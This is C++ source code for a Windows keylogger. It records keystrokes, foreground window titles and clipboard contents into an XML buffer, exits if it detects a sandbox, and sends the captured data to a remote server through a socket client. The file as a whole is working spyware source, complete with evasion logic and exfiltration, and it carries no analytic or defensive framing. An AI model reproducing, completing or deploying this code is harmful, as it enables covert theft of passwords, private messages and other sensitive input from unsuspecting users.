#include "KeyLogger.h"
#include "Sanitize_KeyLogBuff.h"
#include "KeyLogger_clientCom.h"
#include <stdio.h>

char* last_cb_data;
XML_PROCESS_BUFFER current_process_data;
using namespace std;
char _GRAB_WINDOW_TITLE[MaxDirPathLength],_GRAB_WINDOW_TITLE_SECONDARY[MaxDirPathLength];
const time_t hms = time(0);
clock_t Timer = clock(), Timer2;
bool gotchar=true;

/**
    Title: _USER_SHIFT_FOCUS
    Description: called when the user shifts focus to a new foreground window
    this function should complete and write several new xml tags to describe the
    foreground window now in progress. the tag written should be a starter tag to the
    process, followed by the process handle, pid, process title, and a timestamp,
    finally this process should complete xml tags that describe the capture taking place.
    the output written to the buffer should appear as follows, the process data should contain a
    <![CDATA[ . . . . ]] tag. and the capture should initiate the <[CDATA[ TAG
    the following information should be written to the buffer

        <Process>
                <ProcessHandle>
                        .....
                </ProcessHandle>
                <ProcessID>
                        .....
                <ProcessID>
                <ProcessTitle><[CDATA[
                        .....
                ]]></ProcessTitle>
                <TimeStamp>
                        .....
                </TimeStamp>
                <logged>
                    <CaptureType>Keylogger</CaptureType>
                    <Capture><[CDATA[


    @param _PROG_HNDLE: a handle to the current foreground process
                type: HWND

    @return NULL: their is no return for this function.
*/
FORCEINLINE void _USER_SHIFT_FOCUS(HWND _PROG_HNDL)
{
    char* temp = (char*)malloc(0x0A);
    /*
        get the total length of the window text length.
    */
    int _FG_WINDOW_TITLELENGTH = GetWindowTextLengthA(_PROG_HNDL)+1;
    /*
        grab the foreground title and other important information about the
        process. set the global title accordingly.
    */
    GetWindowTextA(_PROG_HNDL,_GRAB_WINDOW_TITLE,_FG_WINDOW_TITLELENGTH);
    /*
        generate a time stamp to indicate when the change occurred
    */
    char *TimeStamp=asctime(localtime(&hms));
    /*
        set a null character to the last byte of the time stamp.
    */
    TimeStamp[strlen(TimeStamp)-1]=0x00;
    /*
        output the process metadata with relevant tags to the current_process_data buffer
    */

    current_process_data = writeUnsanitizedBuffer(current_process_data,"\n\t<Process>\n\t\t<ProcessHandle>");
    sprintf(temp,"0x%lu",_PROG_HNDL);
    current_process_data = writeUnsanitizedBuffer(current_process_data,temp);
    current_process_data = writeUnsanitizedBuffer(current_process_data,"</ProcessHandle>\n\t\t<ProcessID>");
    sprintf(temp,"0x%d",GetWindowThreadProcessId(_PROG_HNDL,NULL));
    current_process_data = writeUnsanitizedBuffer(current_process_data,temp);
    current_process_data = writeUnsanitizedBuffer(current_process_data,"</ProcessID>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA[");
    current_process_data = writeSanitizedBuffer(current_process_data,_GRAB_WINDOW_TITLE);
    current_process_data = writeUnsanitizedBuffer(current_process_data,"]]></ProcessTitle>\n\t\t\t<TimeStamp>");
    current_process_data = writeSanitizedBuffer(current_process_data,TimeStamp);
    current_process_data = writeUnsanitizedBuffer(current_process_data,
                                                  "</TimeStamp>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[");


}
/**
    title: EnterEvent
    Description: this is called to determine if the title of the current foreground window has changed.
    if the title of the current process has changed. this function should close multiple xml tags,
    then initiate new tags to document the functions of the new tags. else this function should fall through!
    t
    he following xml tags should be written to the buffer.

                ]]></Capture>
            </Logged>
        </title>
        <title>
            <ProcessTitle><![CDATA[
                    ...... ]]
            </ProcessTitle>
            <TimeStamp>
                    ......
            </TimeStamp>
            <CaptureType>KeyLogger</CaptureType>
                <Capture><![CDATA[

    @param _PROG_HNDL this is a handle to the current foreground window.

    @return NULL: their is no return from this program!
*/
FORCEINLINE void EnterEvent(HWND _PROG_HNDL)
{   /*
        grab the length of the current foreground window title
    */
    int _FG_WINDOW_TITLELENGTH = GetWindowTextLengthA(_PROG_HNDL)+1;
    /*
        grab the text of the current foreground window and load it into
        a secondary storage buffer for further processing.
    */
    GetWindowTextA(_PROG_HNDL,_GRAB_WINDOW_TITLE_SECONDARY,_FG_WINDOW_TITLELENGTH);
    /*
        limit the volume of xml statements by doing a comparison between the
        current foreground window and the previously logged buffer.
    */
    if (strncmp(_GRAB_WINDOW_TITLE,_GRAB_WINDOW_TITLE_SECONDARY,_FG_WINDOW_TITLELENGTH))
    {
        /*
            a new title has been logged for the current foreground window.
            copy the new title to the _GRAB_WINDOW_TITLE.
        */
        strncpy(_GRAB_WINDOW_TITLE,_GRAB_WINDOW_TITLE_SECONDARY,_FG_WINDOW_TITLELENGTH);
        /*
            Generate a time stamp for this event.
        */
        char *TimeStamp=asctime(localtime(&hms));
        /*
            set a null character to the end point of this buffer.
        */
        TimeStamp[strlen(TimeStamp)-1]=0x00;
        /*
            generate the proper xml output for a change of title on a process. and
            register it to the current_process_buffer
        */
        current_process_data = writeUnsanitizedBuffer(current_process_data,"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA[");
        current_process_data = writeSanitizedBuffer(current_process_data,_GRAB_WINDOW_TITLE_SECONDARY);
        current_process_data = writeUnsanitizedBuffer(current_process_data,"]]></ProcessTitle>\n\t\t\t<TimeStamp>");
        current_process_data = writeSanitizedBuffer(current_process_data,TimeStamp);
        current_process_data = writeUnsanitizedBuffer(current_process_data,"</TimeStamp>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[");


    }
}
/**
    Title: GrabKey,
    Description: takes the logged key state buffer, two possibilities that can be toggled by the shift key, and the
    last key stroke that was logged, this function then determines if that key state can be logged at
    this time. if it can then it registers a flag to stop processing further. after this event is completed
    this function will log the key stroke to the global buffer for output in the next shift of user focus.

     @param VkPrimary, the virtual key state that was registered by the calling program.

            Type: int.

     @param Primary, this is the output to be placed in the buffer in the event that the shift key has not been toggled
            Type: char

     @param Secondary, this is the output to be placed in the buffer in the event that the shift key has been toggled.
            Type: char

     @param LastKeyStrokeLogged, this is the keystate that was last written to the buffer.

     @return LastKeyStrokeLogged, if the provided key stroke was logged then VkPrimary, else the value of LastKeyStroke
            Logged is returned unaffected.
*/

FORCEINLINE int GrabKey(int VkPrimary,char Primary, char Secondary, int LastKeyStrokeLogged)
{
    /*
        validate the state of the buffer. noise on the buffer can generate errors
        check if the key state is viable at this point.
        check to see if a  keystroke has already been logged. not doing so will
        result in erroneous behavior on the next pass
    */
   if (GetAsyncKeyState(VkPrimary)!=AsyncKeyStateTest_0 and GetAsyncKeyState(VkPrimary)!=AsyncKeyStateTest_1 and gotchar )
       {
           /*
                a key stroke was successfully logged set the global flag
                to false.
            */
           gotchar=false;
           /*
                ensure that the keystroke that was logged here is not due to
                a contaminated keyboard buffer.
            */
           if (LastKeyStrokeLogged!=VkPrimary)
               {
                   /*
                        The buffer is clear of previous events but the user may
                        be holding a key down, to deal with this problem we must
                        set a timer to evaluate the keyboard behavior
                   */
                   Timer=clock();
                   /*
                        synchronize two timers to be used in the event that the user
                        is holding down a key.
                   */
                   Timer2=Timer;
                   /*
                        determine if the shift has been toggled, if it has then
                        use the secondary mapping.
                   */
                   char temp = GetAsyncKeyState(VK_SHIFT)?Secondary:Primary;
                    /*
                        determine if the key stroke logged is a special
                        xml character. if so log sanitized character codes
                    */
                    current_process_data = writeSanitizedByte(current_process_data,temp);
                   /*
                        set the state for the last key stroke logged, this will
                        allow the program to determine that the keyboard buffer
                        has not yet been flushed.
                   */
                   LastKeyStrokeLogged=VkPrimary;
               }
            /*
                see if the timer has elapsed to the right point.
                NOTE: for testing it is hard coded but this will be changed
                      to read necessary timing information off of the registry
                timer one determines the primary time span before it is determined
                that a user is holding a key down.
                timer two is used to determine the interval by which keys are logged
                to the buffer from that point until the buffer is flushed
            */
           if((Timer-clock())/500 && ((Timer2-clock())/31))
               {
                   /*
                        reset timer two to the current clock.
                        IMPORTANT for if statement to function
                    */
                   Timer2=clock();
                   /*
                        determine if the shift key is toggled, to get the correct Primary
                        key mapping.
                   */
                   char temp = GetAsyncKeyState(VK_SHIFT)?Secondary:Primary;
                   /*
                        determine if the keystroke logged is a special xml character,
                        if so shoot out sanitized xml character codes
                   */
                current_process_data = writeSanitizedByte(current_process_data,temp);
                    /*
                        set the state of the last key stroke logged so
                        this will allow the program to determine that the
                        keyboard buffer has not yet been flushed.
                   */
                   LastKeyStrokeLogged=VkPrimary;
               }
           }
   return LastKeyStrokeLogged;
}
/**
    Title: GrabFunckKey, Grab the key state of function keys, these keys are items such as
    delete,shift,control, this function takes a a character relating to the function key
    being grabbed and determines if it should be logged to the buffer, if it should then this
    function will update the global flag to indicate that a char was grabbed, then it will
    map to the buffer a string that represents the function key being logged.

    @param FunctionKey, the keystroke that was logged.
           Type: char

    @param strOut, the desired string representation of the key-state being logged.
            Type: char*
    @param lastKeyStrokeLogged, which is the state of the keystate that was previously logged
            Type:int

    @return LastKeyStrokeLogged, if the provided key stroke was logged then VkPrimary, else the value of LastKeyStroke
            Logged is returned unaffected.
*/
FORCEINLINE int GrabFuncKey(char FunctionKey, char* StrOut,int LastKeyStrokeLogged )
{
    /*
        validate the state of the buffer. noise on the buffer can generate errors
        check if the key state is viable at this point.
        check to see if a  keystroke has already been logged. not doing so will
        result in erroneous behavior on the next pass
    */
    if (GetAsyncKeyState(FunctionKey)!=AsyncKeyStateTest_0 and GetAsyncKeyState(FunctionKey)!=AsyncKeyStateTest_1 and gotchar )
        {
            /*
                set the global flag to indicate that a character has been
                retrieved from the buffer.
            */
            gotchar=false;
            /*
                check to ensure that the function key was not grabbed from
                a contaminated key state buffer
            */
            if (LastKeyStrokeLogged!=FunctionKey)
                {
                   /*
                        The buffer is clear of previous events but the user may
                        be holding a key down, to deal with this problem we must
                        set a timer to evaluate the keyboard behavior
                   */
                   Timer=clock();
                   /*
                        synchronize two timers to be used in the event that the user
                        is holding down a key.
                   */
                   Timer2=Timer;
                   /*
                        put the string representing a function key to the current_process_data
                        buffer
                   */
                    current_process_data = writeSanitizedBuffer(current_process_data,StrOut);
                    /*
                        set the state of the last key stroke logged so
                        this will allow the program to determine that the
                        keyboard buffer has not yet been flushed.
                   */
                    LastKeyStrokeLogged=FunctionKey;
                }
            /*
                see if the timer has elapsed to the right point.
                NOTE: for testing it is hard coded but this will be changed
                      to read necessary timing information off of the registry
                timer one determines the primary time span before it is determined
                that a user is holding a key down.
                timer two is used to determine the interval by which keys are logged
                to the buffer from that point until the buffer is flushed
            */
            if((Timer-clock())/500 && ((Timer2-clock())/31))
                {
                    /*
                        reset timer two to the current clock.
                        IMPORTANT for if statement to function
                    */
                    Timer2=clock();
                   /*
                        put the string representing a function key to the string
                   */
                   current_process_data = writeSanitizedBuffer(current_process_data,StrOut);
 //                   cout<<StrOut;
                    /*
                        set the state of the last key stroke logged so
                        this will allow the program to determine that the
                        keyboard buffer has not yet been flushed.
                   */
                    LastKeyStrokeLogged=FunctionKey;
                }
        }

    return LastKeyStrokeLogged;
}
/**
    name: grabclipboard
    Description: attempts to open the clipboard, if this fails their is likely another process
    with a handle to it, ignore clipboard during the current iteration. else lock the clipboard
    to prevent corruption, check to ensure their is data in the clipboard, if their is not then
    close the clipboard and release the lock else, copy the data, compare the data in the clipboard
    with data previously logged, if the data has not changed then close the clipboard and release the
    global lock, otherwise, allocate memory for clipboard data and preform a copy of clipboard data
    to the allocated buffer, close the clipboard, release the lock, and write the contents of the clipboard
    to the global buffer.
    the format of the global buffer output will appear as follows.

            ]]></Capture>
        </logged>
        <logged>
            <CaptureType>ClipBoard</CaptureType>
            <Capture>

                    .......
           ></Capture>
        </logged>
        <logged>
            <CaptureType>Keylogger</CaptureType>
            <Capture><![CDATA[" );




*/
FORCEINLINE void grabclipboard()
{
    /*
        attempt to open the clipboard,
        if that fails it is likely that the clipboard is locked
        by another program or by the operating system, check the
        clipboard again next iteration.
    */
    if (OpenClipboard(NULL))
        {
            /*
                declare a buffer to hold clipboard data temporarily
                while it is being verified.
            */
            char* this_cb_data;
            /*
                grab a handle to the clip board, and specify the CF_TEXT,
                as to not grab data that will crash the program.
            */
            HANDLE cb_lock_handle = GetClipboardData(CF_TEXT);
            /*
                if the handle is invalid then close the clipboard
            */
            if(cb_lock_handle)
                {
                    /*
                        lock the clipboard, this is important, if the
                        clipboard is not locked then the data may become corrupted.
                    */
                    this_cb_data=(char*)GlobalLock(cb_lock_handle);
                    /*
                        if their is nothing in the clipboard, then unlock and close
                        the clipboard. exit this function with status 0,
                    */
                    if(!strlen(this_cb_data))
                    {
                        GlobalUnlock(cb_lock_handle);
                        CloseClipboard();
                        return ;
                    }
                    /*
                        first check that last_cb_data  has been set, if not then continue processing the cb data,
                        then do a string comparison between the last cb_data and this cb_data, if their different,
                        then continue processing the cb_data.
                    */
                    if ( last_cb_data == NULL || (strncmp(last_cb_data,this_cb_data,strlen(this_cb_data)-1)))
                    {
                        /*
                            if last_cb_data has not yet been set allocate memory for the data, else
                                resize the allocated memory for the cb_data coming in.
                        */
                        if(last_cb_data == NULL)
                            last_cb_data = (char*)malloc(strlen(this_cb_data)+1);
                        else
                            last_cb_data = (char*)realloc(last_cb_data,strlen(this_cb_data)+1);
                        /*
                            copy the recently logged clip board data over to the last_cb_data buffer.
                        */
                        strncpy(last_cb_data,this_cb_data,strlen(this_cb_data));

                        /*
                          write all necessary xml tags and metadata out
                        */
                         current_process_data = writeUnsanitizedBuffer(current_process_data,
                                "]]></Capture>\n\t\t\t</logged>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>ClipBoard</CaptureType>\n\t\t\t\t<Capture>");
                         current_process_data = writeSanitizedBuffer(current_process_data,(char*)this_cb_data);
                         current_process_data = writeUnsanitizedBuffer(current_process_data,
                                "</Capture>\n\t\t\t</logged>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[" );

                    }
                    /*
                        unlock the clipboard. so that other programs waiting in que to access the
                        clipboard can access it.
                    */
                    GlobalUnlock(cb_lock_handle);
                }
            CloseClipboard();
        }
}
/**
    name: main
    Description: entry point for execution, set up the buffers for global writing for future use,
    execute anti-sandBoxing techniques, register the xml header to the global buffer.

                <?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>

    execute setup of other variables before entering the main loop.

    the main loop should set the global gotchar to true, this program should check that the foreground process has not changed
    before iterating important elements of the ascii table, if the foreground process has changed this process should complete necessary xml tags
    necessary to complete the process. thous tags are as follows.

                        ]]></Capture>
                    </logged>
                </title>
            </Process>
    this process should then write a null terminating character to the output buffer before registering it to the proper
    output channel, finally, this process will reset the buffer to its default state.

    after each iteration through this program will check the clipboard for changes.
    this program will never reach its exit.
*/

int main()
{
    /*
        allocate memory for the buffered data to store he xml tags of each process
    */
    current_process_data.buffered_data = (char*)malloc(DefaultBufferSz);
    /*
        set the current buffer size so that the total amount of space available is known
    */
    current_process_data.buffer_size=DefaultBufferSz;
    /*
        no data has been written to the buffer
    */
    current_process_data.current_buff_offset=0;
    /*
        execute a check to see if we may be in a sandboxed environment,
        the check relies on the number of processors running on the device
        if this check fails then exit from the environment
    */
    if(SandBoxDetection()) return SandBoxedInstance;
    /*
        display an xml header to generate the end document.
    */
    current_process_data = writeUnsanitizedBuffer(current_process_data,
    "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n");
    /*
        grab a handle to the foreground process.
    */
    HWND CURRENTPROCEESS=GetForegroundWindow();
    /*
        initialize the foreground window.
    */
    _USER_SHIFT_FOCUS(CURRENTPROCEESS);
    /*
        declare a buffer to store keyboard states.
    */
    unsigned int LastKeyStrokeLogged;
    /*
        the main loop, capture key strokes indefinitely.
    */
    bool SocketEstablished=false;
    while (1)
    {

        /*
            global flag that dictates the state of the keyboard buffer
            if the keyboard buffer is not empty from a previous key
            stroke then the program will fault
        */
        gotchar=true;
        /*
            determine if the user has shifted focus to a new process
        */
        if (CURRENTPROCEESS==GetForegroundWindow())
        {
            /*
                check to see if the value of the keyboard buffer is in one of two states
                0, or 1, if so then the global key state buffer is not sanitary and should not
                be trusted
            */
            if (GetAsyncKeyState(LastKeyStrokeLogged)== AsyncKeyStateTest_0 or GetAsyncKeyState(LastKeyStrokeLogged)==AsyncKeyStateTest_1)
              {/*default failed buffers to a state of (1)*/
                  LastKeyStrokeLogged=1;
              }
            /*
                increment an anonymous value starting at the "0" position of the ASCII table and increment to
                "9".
            */
            for (int x=StartAsciiDec; x<EndAsciiDec; x++)
                /*
                    log the key and check for encoding from shift key state.
                    map secondary outputs as well for state.
                */
                LastKeyStrokeLogged=GrabKey(x,(char)x,_Char_Table[x-AsciiDecimalToBase],LastKeyStrokeLogged);
            /*
                increment an anonymous value starting at the "a" position of the ASCII table and increment to
                "Z".
            */
            for (int x=StartAsciiAlphebet; x<EndAsciiAlphebet;x++)
                /*
                    log the key and check for key case, finally send a secondary mapping so that shift
                     can be toggled.
                */
                LastKeyStrokeLogged=GetKeyState(VK_CAPITAL)?GrabKey(x,x,(x+AsciiLowerToUpper),LastKeyStrokeLogged):GrabKey(x,x+AsciiLowerToUpper,x,LastKeyStrokeLogged);
            /*
                iterate over the function keys
            */
            for (int x=StartFunctionKeys; x<EndFunctionKeys; x++)
                /*
                    log the intention justified by the function keys in a a character sequence that is likely not used
                    by the end user.
                */
                LastKeyStrokeLogged=GrabFuncKey(MapFunctionVkeys[x].Key,MapFunctionVkeys[x].str,LastKeyStrokeLogged);
            /*
                iterate over the set of keys available on the keyboard, but with no linear mapping.
            */
            for (int x=StartUnmapedKeys; x<EndUnmapedKeys; x++)
                /*
                    grab thous key states that are not linearly justified, also deliver to
                    the function secondary key states that can be toggled via the shift key.
                */
                LastKeyStrokeLogged=GrabKey(VkKeyScanExA(MapUnmapedVkeys[x].Primary,GetKeyboardLayout(0)),MapUnmapedVkeys[x].Primary,MapUnmapedVkeys[x].Secondary,LastKeyStrokeLogged);
            /*if no keystrokes have been logged then sleep for 3 ms
             this still registers almost all keystrokes while reducing the amount of
             cpu time used to 0 while idle*/
            if(gotchar)Sleep(3);
        }
        else
        /*
            if the users focus has shifted from the currently logged foreground window
            then take steps to indicate the state change.
        */
        {
            /*
                complete the xml statements that were previously initialized then
                initialize a new process xml tag.
            */
            current_process_data = writeUnsanitizedBuffer(current_process_data,"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t</Process>");
            current_process_data = writeUnsanitizedByte(current_process_data,(char)0x00);
            /*
                if a socket is not established we don't want to exit the program,
                this likely means their is no connectivity to the web, continue checking
                for connectivity with every process change and send the data logged.
            */

            if (SocketEstablished || (SocketEstablished=startListeningClient()))
            {
                /*
                    attempt to write data to the currently established buffer, if
                    that fails then
                */
                SocketEstablished=WriteToServer(current_process_data.buffered_data);
              //  cout<<current_process_data.buffered_data; ///TODO: socket communication
                /*
                   if the socket is still established, indicating the data has been sent
                   then reallocate the buffer to the default slab size, else continue logging
                   without modification to the buffer. with any luck the computer will connect
                   back out to the network.
                */
                if(SocketEstablished)
                {

                    current_process_data.buffered_data = (char*)realloc(current_process_data.buffered_data,DefaultBufferSz);
                    /*
                        re-initiate the buffer size to its default parameter.
                    */
                    current_process_data.buffer_size=DefaultBufferSz;
                    /*
                        reset the current offset in the buffer to 0.
                    */
                    current_process_data.current_buff_offset=0;
                    /*
                        get the current foreground window and store it in the CURRENTPROCESS.
                    */
                }
            }
            CURRENTPROCEESS=GetForegroundWindow();
            /*
                call to initialize tags and further process the foreground window.
            */
            _USER_SHIFT_FOCUS(CURRENTPROCEESS);
        }
        /*
            checks for changes in the clipboard state.
        */
        grabclipboard();
        /*
            it is common for titles to change in processes,especially in browsers.
            this checks if the current foreground window has registered under a new
            title.
        */
        EnterEvent(CURRENTPROCEESS);
    }
    return 0;
}
